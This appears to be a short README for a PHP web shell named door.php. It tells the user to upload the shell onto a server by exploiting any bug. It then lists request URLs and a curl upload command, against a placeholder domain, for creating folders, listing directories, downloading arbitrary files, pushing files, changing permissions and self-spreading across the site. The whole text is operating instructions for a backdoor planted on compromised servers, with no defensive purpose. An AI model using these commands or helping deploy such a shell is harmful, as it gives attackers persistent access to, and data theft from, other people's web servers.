# PHP-SHELL

HOW TO USE

upload this shell to server by using any bug 

https://test.co/bd/door.php?action=make_folder&destination=/home/test/public_html/bd&folder_name=test    to make folder_name
https://test.co/bd/door.php?destination=/home/test/public_html&action=scan_dir   to list directory
test.co/bd/door.php?action=download&download=/home/test/public_html/20715_errorlog.php  to download file
curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@style.css" -F "location=/home/test/public_html/test" http://test.co/bd/door.php?action=upload   to push file

http://test.co/bd/door.php?action=chmod&destination=/home/test/public_html/test to change permission

http://test.co/bd/door.php?action=spread&destination=/home/test/public_html/bd   to self spread

